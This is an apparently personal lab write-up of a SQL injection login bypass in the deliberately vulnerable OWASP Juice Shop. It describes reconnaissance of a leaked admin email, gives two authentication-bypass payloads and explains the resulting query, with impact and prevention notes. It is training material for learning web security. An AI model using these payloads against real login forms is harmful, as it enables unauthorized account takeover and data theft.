# SQL Injection Exploitation in OWASP Juice Shop (Login Bypass)

## Overview

- The login page in **OWASP Juice Shop** can be vulnerable to **SQL Injection**, allowing an attacker to bypass authentication and gain unauthorized access.

## Objective

- Exploit the login form to bypass username/password verification.

## Recon Phase (Information Gathering)

Before attacking the login page, useful data was discovered from the product review section.

### Product Found

**Apple Juice (1000ml)**  
*The all-time classic.*

**Price:** 1.99¤

### Public Review Leak

| Reviewer | Comment |
|---------|---------|
| admin@juice-sh.op | One of my favorites! |

![[2026-04-16_16-21.png]]

### Important Discovery

```text
admin@juice-sh.op
````

>This exposed a valid **administrator email address**, which can be used during login attacks.


## Attack Objective

-  Use the leaked admin account email with SQL Injection to access the admin panel.

## Step-by-Step Attack

### Step 1: Open Login Page

- Navigate to the Juice Shop login page.

### Step 2: Use Admin Email + SQLi Payload

|Field|Value|
|---|---|
|Email|`admin@juice-sh.op'--`|
|Password|`anything`|

### Alternate Payload

|Field|Value|
|---|---|
|Email|`' OR 1=1--`|
|Password|`' OR 1=1--`|


## How It Works

Example vulnerable query:

```sql
SELECT * FROM users
WHERE email = 'admin@juice-sh.op'--'
AND password = 'anything'
```

### Explanation

- `--` comments out password verification
    
- Query only checks email
    
- Logs attacker in as admin


## Impact

### Critical Risks

- Admin account takeover
    
- Unauthorized dashboard access
    
- View user data
    
- Change settings
    
- Access orders/payment info
    
- Full application compromise

## Severity

**Critical**

## OWASP Category

- A03:2021 – Injection

## Prevention

- Use **Parameterized Queries / Prepared Statements**
    
- Input validation
    
- Escape special characters
    
- Least privilege database accounts
    
- WAF protection
    
- Secure error handling

## Important Note

- This technique should only be practiced in legal labs like **OWASP Juice Shop**.
